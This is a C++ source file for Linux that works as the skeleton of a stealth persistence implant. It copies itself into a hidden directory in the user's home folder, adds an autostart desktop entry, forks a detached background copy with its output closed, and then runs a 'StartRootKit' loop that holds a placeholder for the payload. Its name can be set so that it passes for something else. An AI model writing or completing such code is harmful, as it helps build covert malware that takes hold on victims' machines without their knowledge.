#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <limits.h>

// ===== CONFIGURATION - CHANGE THESE VALUES =====
const char* PROGRAM_NAME = "MyCustomApp";  // Change to your desired name
// ===== END CONFIGURATION =====

std::string GetHiddenDir() {
    const char* home = getenv("HOME");
    if (!home) return "";
    return std::string(home) + "/." + PROGRAM_NAME;
}

std::string GetExeName() {
    char path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
    if (len == -1) return "";
    path[len] = '\0';
    std::string fullPath(path);
    size_t pos = fullPath.find_last_of('/');
    return (pos == std::string::npos) ? fullPath : fullPath.substr(pos+1);
}

std::string GetHiddenExePath() {
    return GetHiddenDir() + "/" + GetExeName();
}

bool IsHiddenInstance() {
    char currentPath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", currentPath, sizeof(currentPath)-1);
    if (len == -1) return false;
    currentPath[len] = '\0';
    
    return std::string(currentPath) == GetHiddenExePath();
}

void SetAutorun() {
    std::string autostartDir = std::string(getenv("HOME")) + "/.config/autostart";
    mkdir(autostartDir.c_str(), 0700);
    
    std::string desktopFile = autostartDir + "/" + PROGRAM_NAME + ".desktop";
    std::ofstream ofs(desktopFile);
    if (ofs.is_open()) {
        ofs << "[Desktop Entry]\n";
        ofs << "Type=Application\n";
        ofs << "Name=" << PROGRAM_NAME << "\n";
        ofs << "Exec=" << GetHiddenExePath() << "\n";
        ofs << "Terminal=false\n";
        ofs << "Hidden=false\n";
        ofs.close();
        chmod(desktopFile.c_str(), 0644);
    }
}

void InstallAndHide() {
    char currentPath[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", currentPath, sizeof(currentPath)-1);
    if (len == -1) return;
    currentPath[len] = '\0';
    
    std::string hiddenDir = GetHiddenDir();
    mkdir(hiddenDir.c_str(), 0700);
    
    std::string targetExe = GetHiddenExePath();
    
    // Copy executable
    std::ifstream src(currentPath, std::ios::binary);
    std::ofstream dst(targetExe, std::ios::binary);
    dst << src.rdbuf();
    src.close();
    dst.close();
    
    // Set executable permissions
    chmod(targetExe.c_str(), 0700);
    SetAutorun();
}

void StartRootKit() {
    // Linux-compatible persistence - replace with your actual functionality
    while (true) {
        // Placeholder for rootkit tasks
        sleep(10);
    }
}

void LaunchHiddenCopy() {
    std::string targetExe = GetHiddenExePath();
    pid_t pid = fork();
    if (pid == 0) {
        setsid(); // Detach from terminal
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
        execl(targetExe.c_str(), targetExe.c_str(), nullptr);
        exit(EXIT_FAILURE);
    }
}

int main() {
    if (IsHiddenInstance()) {
        StartRootKit();
    } else {
        // Fork to background
        pid_t pid = fork();
        if (pid != 0) return 0;
        
        InstallAndHide();
        LaunchHiddenCopy();
    }
    return 0;
}